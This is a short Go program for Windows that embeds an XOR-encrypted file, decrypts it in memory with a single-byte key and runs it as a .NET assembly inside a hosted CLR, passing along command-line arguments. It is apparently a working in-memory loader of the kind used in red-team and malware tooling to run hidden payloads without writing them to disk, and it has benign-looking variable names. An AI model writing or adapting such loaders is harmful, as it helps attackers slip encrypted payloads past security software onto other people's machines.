//go:build windows
// +build windows

package main

import (
	_ "embed"
	"fmt"
	"os"

	clr "github.com/almounah/go-buena-clr"
)

//go:embed file.enc
var testNetCipher []byte

func main() {
    params := os.Args[1:]

	var testNet []byte

	key := byte(133)

	for i := 0; i < len(testNetCipher); i++ {
		testNet = append(testNet, testNetCipher[i]^key)
	}
	// output, _ := LoadBin(testNet, params, "v4.0.30319", true)
	pRuntimeHost, identityString, _ := clr.LoadGoodClr("v4.0.30319", testNet)
	assembly := clr.Load2Assembly(pRuntimeHost, identityString)
	pMethodInfo, _ := assembly.GetEntryPoint()
	clr.InvokeAssembly(pMethodInfo, params)

	fmt.Println("Done Executing ......................")
}
